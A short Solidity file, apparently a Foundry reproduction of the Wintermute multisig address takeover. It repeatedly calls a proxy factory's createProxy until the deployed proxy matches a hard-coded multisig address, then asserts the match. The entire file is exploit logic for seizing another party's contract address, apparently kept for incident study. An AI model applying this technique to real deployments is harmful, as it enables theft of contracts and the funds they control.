pragma solidity 0.8.13;

import "forge-std/Test.sol";

interface IFactory {
    function createProxy(address masterCopy, bytes calldata data)
        external
        returns (address payable proxy);
}

contract Wintermute {
    address constant FACTORY_ADDRESS =
        0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B;
    address constant WINTERMUTE_MULTISIG =
        0x4f3a120E72C76c22ae802D129F599BFDbc31cb81;

    IFactory factory = IFactory(FACTORY_ADDRESS);

    function generateAddress() external {
        address childContract;

        // Loop untill the child contract is created
        while (childContract != WINTERMUTE_MULTISIG) {
            childContract = factory.createProxy(
                address(this),
                "0x"
            );
        }

        // Verify that childContract == Wintermute multisig
        assert(childContract == WINTERMUTE_MULTISIG);
    }

    fallback() external {}
}
